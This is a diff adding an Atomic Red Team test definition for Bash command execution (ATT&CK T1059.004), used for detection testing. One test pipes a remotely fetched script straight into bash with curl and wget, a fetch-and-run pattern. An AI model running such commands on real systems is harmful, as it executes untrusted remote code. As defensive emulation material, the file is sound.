@@ -1,0 +1,33 @@
+attack_technique: T1059.004
+display_name: 'Command and Scripting Interpreter: Bash'
+atomic_tests:
+- name: Create and Execute Bash Shell Script
+  auto_generated_guid: 7e7ac3ed-f795-4fa5-b711-09d6fbe9b873
+  description: |
+    Creates and executes a simple bash script.
+  supported_platforms:
+  - macos
+  - linux
+  executor:
+    command: |
+      sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
+      sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
+      chmod +x /tmp/art.sh
+      sh /tmp/art.sh
+    name: sh
+- name: Command-Line Interface
+  auto_generated_guid: d0c88567-803d-4dca-99b4-7ce65e7b257c
+  description: |
+    Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.
+
+    Upon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.
+  supported_platforms:
+  - macos
+  - linux
+  executor:
+    command: |
+      curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/echo-art-fish.sh | bash
+      wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/echo-art-fish.sh | bash
+    cleanup_command: |
+      rm /tmp/art-fish.txt
+    name: sh
